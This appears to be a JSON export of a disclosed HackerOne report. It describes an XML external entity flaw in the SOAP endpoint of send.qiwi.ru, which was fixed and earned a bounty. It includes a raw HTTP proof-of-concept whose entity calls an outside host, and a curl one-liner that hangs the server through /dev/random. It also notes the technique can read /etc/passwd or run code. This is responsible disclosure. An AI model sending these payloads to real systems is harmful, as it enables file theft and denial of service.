{"id":36450,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjQ1MA==","url":"https://hackerone.com/reports/36450","title":"[send.qiwi.ru] Soap-based XXE vulnerability /soapserver/ ","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-11-17T22:31:53.825Z","submitted_at":"2014-11-17T22:31:53.825Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bitquark","url":"/bitquark","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/068/5b51009b3fd817bf0a054d36aa792c7068efa1b8_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":215,"url":"https://hackerone.com/qiwi","handle":"qiwi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"QIWI","twitter_handle":"QiwiRussia","website":"https://qiwi.com","about":"The QIWI brand is a family brand that consolidates several directions: kiosks, wallet, bank and even terminals of goods delivery."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2014-12-18T15:05:45.315Z","bug_reporter_agreed_on_going_public_at":"2014-11-18T15:05:35.325Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"An XML external entities injection vulnerability exists on the soap server hosted on send.qiwi.ru. The attack allows an attacker to open local files (although perhaps not return the data, see below), leading at best to a DoS.\r\n\r\nOften this attack can be used to extract files from the server (such as /etc/passwd), or even directly execute code if the PHP expect module is installed, however in this case exploitation isn't as straight forward as the issue occurs in the XML pre-check code and no user input is returned. That's not to say there isn't a away to exfiltrate data, but I haven't had time to fully investigate.\r\n\r\nAt best, this attack can be used as a denial-of-service, opening up /dev/random thousands of times until the server falls over through memory use and CPU load.\r\n\r\nProof-of-concept (change bitquark.co.uk to a site you control and watch the access logs; or change to file:///dev/urandom and the script will hang):\r\n\r\n    POST /soapserver/ HTTP/1.1\r\n    Host: send.qiwi.ru\r\n    Content-Type: application/x-www-form-urlencoded\r\n    Content-Length: 254\r\n\r\n    \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003c!DOCTYPE aa[\u003c!ELEMENT bb ANY\u003e\u003c!ENTITY xxe SYSTEM \"https://bitquark.co.uk/?xxe\"\u003e]\u003e\r\n    \u003cSOAP-ENV:Envelope\u003e\r\n      \u003cSOAP-ENV:Body\u003e\r\n        \u003cgetStatus\u003e\r\n\t    \u003cid\u003e\u0026xxe;\u003c/id\u003e\r\n        \u003c/getStatus\u003e\r\n      \u003c/SOAP-ENV:Body\u003e\r\n    \u003c/SOAP-ENV:Envelope\u003e\r\n\r\nYou'll get the error \"DTD are not supported by SOAP\", but the attack will have succeeded.\r\n\r\nFor more information on XXE vulnerabilities in PHP in particular, see:\r\n\r\nhttp://phpsecurity.readthedocs.org/en/latest/Injection-Attacks.html#xml-external-entity-injection","vulnerability_information_html":"\u003cp\u003eAn XML external entities injection vulnerability exists on the soap server hosted on send.qiwi.ru. The attack allows an attacker to open local files (although perhaps not return the data, see below), leading at best to a DoS.\u003c/p\u003e\n\n\u003cp\u003eOften this attack can be used to extract files from the server (such as /etc/passwd), or even directly execute code if the PHP expect module is installed, however in this case exploitation isn\u0026#39;t as straight forward as the issue occurs in the XML pre-check code and no user input is returned. That\u0026#39;s not to say there isn\u0026#39;t a away to exfiltrate data, but I haven\u0026#39;t had time to fully investigate.\u003c/p\u003e\n\n\u003cp\u003eAt best, this attack can be used as a denial-of-service, opening up /dev/random thousands of times until the server falls over through memory use and CPU load.\u003c/p\u003e\n\n\u003cp\u003eProof-of-concept (change bitquark.co.uk to a site you control and watch the access logs; or change to file:///dev/urandom and the script will hang):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /soapserver/ HTTP/1.1\nHost: send.qiwi.ru\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 254\n\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE aa[\u0026lt;!ELEMENT bb ANY\u0026gt;\u0026lt;!ENTITY xxe SYSTEM \u0026quot;https://bitquark.co.uk/?xxe\u0026quot;\u0026gt;]\u0026gt;\n\u0026lt;SOAP-ENV:Envelope\u0026gt;\n  \u0026lt;SOAP-ENV:Body\u0026gt;\n    \u0026lt;getStatus\u0026gt;\n    \u0026lt;id\u0026gt;\u0026amp;xxe;\u0026lt;/id\u0026gt;\n    \u0026lt;/getStatus\u0026gt;\n  \u0026lt;/SOAP-ENV:Body\u0026gt;\n\u0026lt;/SOAP-ENV:Envelope\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYou\u0026#39;ll get the error \u0026quot;DTD are not supported by SOAP\u0026quot;, but the attack will have succeeded.\u003c/p\u003e\n\n\u003cp\u003eFor more information on XXE vulnerabilities in PHP in particular, see:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://phpsecurity.readthedocs.org/en/latest/Injection-Attacks.html#xml-external-entity-injection\" href=\"/redirect?url=http%3A%2F%2Fphpsecurity.readthedocs.org%2Fen%2Flatest%2FInjection-Attacks.html%23xml-external-entity-injection\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://phpsecurity.readthedocs.org/en/latest/Injection-Attacks.html#xml-external-entity-injection\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-12-18T15:05:35.635Z","allow_singular_disclosure_after":-190305523.58304203,"singular_disclosure_allowed":true,"vote_count":17,"voters":["bogdantcaciuc","spam404","mik317","cyanpiny","specters","tuplesec","almaco","ahmedelmalky","exception","khoata","and 7 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":162854,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's a quick cURL proof-of-concept which makes the script open /dev/random and hang:\n\ncurl -is --data $'\u003c?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?\u003e\u003c!DOCTYPE aa[\u003c!ELEMENT bb ANY\u003e\u003c!ENTITY xxe SYSTEM \\\"file:///dev/random\\\"\u003e]\u003e\u003cSOAP-ENV:Envelope\u003e\u003cSOAP-ENV:Body\u003e\u003cgetStatus\u003e\u003cid\u003e\u0026xxe;\u003c/id\u003e\u003c/getStatus\u003e\u003c/SOAP-ENV:Body\u003e\u003c/SOAP-ENV:Envelope\u003e' https://send.qiwi.ru/soapserver/","markdown_message":"\u003cp\u003eHere\u0026#39;s a quick cURL proof-of-concept which makes the script open /dev/random and hang:\u003c/p\u003e\n\n\u003cp\u003ecurl -is --data $\u0026#39;\u0026lt;?xml version=\\\u0026quot;1.0\\\u0026quot; encoding=\\\u0026quot;UTF-8\\\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE aa[\u0026lt;!ELEMENT bb ANY\u0026gt;\u0026lt;!ENTITY xxe SYSTEM \\\u0026quot;file:///dev/random\\\u0026quot;\u0026gt;]\u0026gt;soap-env:Envelopesoap-env:Body\u0026lt;getStatus\u0026gt;\u0026lt;id\u0026gt;\u0026amp;xxe;\u0026lt;/id\u0026gt;\u0026lt;/getStatus\u0026gt;\u003ca title=\"/SOAP-ENV:Body\" href=\"/SOAP-ENV:Body\"\u003e/SOAP-ENV:Body\u003c/a\u003e\u003ca title=\"/SOAP-ENV:Envelope\" href=\"/SOAP-ENV:Envelope\"\u003e/SOAP-ENV:Envelope\u003c/a\u003e\u0026#39; \u003ca title=\"https://send.qiwi.ru/soapserver/\" href=\"/redirect?url=https%3A%2F%2Fsend.qiwi.ru%2Fsoapserver%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://send.qiwi.ru/soapserver/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2014-11-17T22:39:30.291Z","updated_at":"2014-11-17T22:39:30.291Z","actor":{"username":"bitquark","cleared":false,"url":"/bitquark","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/068/5b51009b3fd817bf0a054d36aa792c7068efa1b8_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":163432,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2014-11-18T10:45:22.124Z","updated_at":"2014-11-18T10:45:22.124Z","additional_data":{"old_title":"Soap-based XXE vulnerability on send.qiwi.ru","new_title":"[send.qiwi.ru] Soap-based XXE vulnerability /soapserver/ "},"actor":{"username":"videns","cleared":false,"url":"/videns","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":163436,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2014-11-18T10:49:46.489Z","updated_at":"2014-11-18T10:49:46.489Z","actor":{"username":"videns","cleared":false,"url":"/videns","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":163492,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2014-11-18T12:00:39.381Z","updated_at":"2014-11-18T12:00:39.381Z","actor":{"username":"isox","cleared":false,"url":"/isox","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/507/53ee156fd5b0b3b9a7bbc254dad1b482e30537ff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bitquark","url":"/bitquark"},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":163496,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank's, that's a good bug :)","markdown_message":"\u003cp\u003eThank\u0026#39;s, that\u0026#39;s a good bug :)\u003c/p\u003e\n","automated_response":false,"created_at":"2014-11-18T12:03:00.525Z","updated_at":"2014-11-18T12:03:00.525Z","actor":{"url":"/qiwi","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"QIWI"}},"bounty_amount":"1000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"qiwi","collaborator":{"username":"bitquark","url":"/bitquark"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":163551,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Fix confirmed, thanks for the super quick response and reward! :-)","markdown_message":"\u003cp\u003eFix confirmed, thanks for the super quick response and reward! :-)\u003c/p\u003e\n","automated_response":false,"created_at":"2014-11-18T13:00:55.238Z","updated_at":"2014-11-18T13:00:55.238Z","actor":{"username":"bitquark","cleared":false,"url":"/bitquark","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/068/5b51009b3fd817bf0a054d36aa792c7068efa1b8_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":163695,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-11-18T15:05:35.341Z","updated_at":"2014-11-18T15:05:35.341Z","first_to_agree":true,"actor":{"username":"bitquark","cleared":false,"url":"/bitquark","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/068/5b51009b3fd817bf0a054d36aa792c7068efa1b8_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":183098,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-12-18T15:05:45.409Z","updated_at":"2014-12-18T15:05:45.409Z","actor":{"url":"/qiwi","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"QIWI"}},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}